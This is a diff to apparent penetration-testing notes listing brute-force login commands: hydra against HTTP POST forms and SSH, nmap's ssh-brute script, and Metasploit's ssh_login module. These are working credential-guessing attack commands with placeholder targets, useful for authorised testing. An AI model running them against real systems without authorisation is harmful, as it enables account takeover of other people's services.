@@ -19,3 +19,14 @@ http-post-form:
 > hydra <URL> <service http-post-form> 
   <login page "/login.php">:<user parameter "usr=">^USER^&<pass parameter "pass">^PASS^:<failed string - invalid credentials> -P <password list> -f <stop when creds found> -V   
 > hydra <ip> ssh -L <user file> -P <password file>
+
+nmap ssh-brute:
+> nmap -p 22 --script ssh-brute --script-args userdb=user.txt,/usr/share/nmap/nselib/data/passwords.lst <target>
+
+msfconsole ssh brute force:
+> msfconsole -q
+> use auxiliary/scanner/ssh/ssh_login
+> set rhosts
+> set username
+> set pass_file
+> run
